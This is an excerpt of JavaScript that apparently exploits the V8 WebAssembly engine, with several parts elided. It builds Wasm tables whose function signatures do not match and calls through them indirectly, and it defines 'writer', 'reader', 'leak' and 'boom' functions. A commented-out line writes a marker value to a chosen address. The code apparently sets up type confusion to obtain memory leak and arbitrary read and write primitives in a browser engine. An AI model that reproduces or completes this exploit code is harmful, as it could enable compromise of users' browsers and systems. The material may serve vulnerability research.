...
let $sig_l_ls = builder.addType(makeSig([kWasmI64, wasmRefType($struct)], [kWasmI64]));
let $sig_l_ll = builder.addType(kSig_l_ll);
let $sig_v_v = builder.addType(kSig_v_v);
let $sig_v_i = builder.addType(kSig_v_i);
let $sig_lX_v = builder.addType(makeSig([], Array(32).fill(kWasmI64)));
let $writer = builder.addFunction("writer", $sig_l_ls)
  .exportFunc()
  .addBody([
    kExprLocalGet, 1,
    kExprLocalGet, 0,
...
let $reader = builder.addFunction("reader", $sig_l_ls)
  .exportFunc()
  .addBody([
    kExprLocalGet, 1,
...
$rec.addBody([
    kExprBlock, kWasmVoid,
      ...
      kExprI64Const, ...wasmSignedLeb64(0x0123456789abcdefn),
      kExprI64Const, ...wasmSignedLeb64(0x1123456789abcdefn),
      kExprI64Mul,
      kExprI64Const, ...wasmSignedLeb64(0x2123456789abcdefn),
      kExprI64Mul,
      kExprI64Const, ...wasmSignedLeb64(0x3123456789abcdefn),
      kExprI64Mul,
      kExprI64Const, ...wasmSignedLeb64(0x4123456789abcdefn),
      kExprI64Mul,
      kExprI64Const, ...wasmSignedLeb64(0x5123456789abcdefn),
      kExprI64Mul,
      kExprDrop,
    kExprEnd,
  ]);
let $t0 = builder.addTable(wasmRefNullType($sig_l_ll), 1, 1).exportAs("table_l_ll");
let $t1 = builder.addTable(wasmRefNullType($sig_lX_v), 1, 1).exportAs("table_lX_v");
builder.addTable(wasmRefNullType($sig_v_v), 1, 1);
builder.addTable(wasmRefNullType($sig_v_v), 1, 1);
let $t4 = builder.addTable(wasmRefNullType($sig_l_ls), 1, 1).exportAs("table_l_ls");
let $t5 = builder.addTable(wasmRefNullType($sig_v_v), 1, 1).exportAs("table_v_v");

let $leak = builder.addFunction("leak", $sig_lX_v)
  .exportFunc()
  .addBody([
    kExprI32Const, 0,
    kExprCallIndirect, $sig_lX_v, $t1.index,
  ]);
...
let { writer, reader, dummy, boom, nop, leak_rec, table_l_ls, table_v_v } = instance.exports;
...
//boom(0x0000133700000000n - 0x7n, 0xdeadbeefcafebaben);
